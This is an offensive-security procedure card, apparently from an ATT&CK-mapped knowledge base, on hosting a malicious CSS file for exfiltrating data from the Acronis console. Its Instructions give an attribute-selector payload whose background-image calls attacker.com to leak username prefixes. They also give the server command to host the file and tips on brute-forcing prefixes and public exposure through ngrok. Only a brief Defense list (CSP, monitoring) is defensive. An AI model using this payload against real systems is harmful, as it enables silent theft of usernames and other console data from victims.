---
id: proc-host-malicious-css-1245165
tags:
  - malicious-css
  - hosting
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:26:21.920Z'
skill_level: beginner
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Host Malicious CSS File on Attacker Server

## Summary

This procedure involves creating and hosting a CSS file with embedded exfiltration rules on an attacker-controlled server to be loaded via the chained vulnerabilities.

## Description

The malicious CSS targets specific DOM elements in the Acronis console using selectors to extract attributes (e.g., data-test-name for usernames) and triggers exfiltration via CSS properties like background-image, which cause GET requests to the attacker server with encoded data. This requires a simple web server setup. Expected outcomes: CSS file ready for redirect-based loading, capable of silent data theft.

## Requirements

1. Local or remote web server (e.g., Python http.server or Apache)
2. Text editor for CSS creation
3. Publicly accessible URL for the CSS (e.g., via ngrok if local)

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP to block external CSS loads
- Monitor for unusual outbound GET requests from CSS contexts
- Sanitize DOM attributes to prevent easy selector targeting

## Objectives

1. Create CSS rules for data extraction
2. Host file accessibly for redirect exploitation
3. Verify exfiltration mechanics

## Instructions

### Step 1: Create Malicious CSS File

**Context**: Write CSS rules that target console elements and exfiltrate data.

Create core.css with content like:

```css
html { background-color: black; color: green; }
a[class='breadcrumbs-item dropdown-item-link'][data-test-name^='A'] { background-image: url('http://attacker.com/exfil?user=A'); }
/* Add more selectors for hashes, IP, etc. */
```

> Tailor selectors to actual DOM (e.g., brute-force prefixes like 'A' for usernames).

### Step 2: Host the File

**Context**: Serve the CSS from a controllable domain.

Run a local server: python -m http.server 80 in the directory, access at http://localhost/css/core.css.

> Use ngrok or similar for public exposure if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- malicious-css
- hosting
- exfiltration
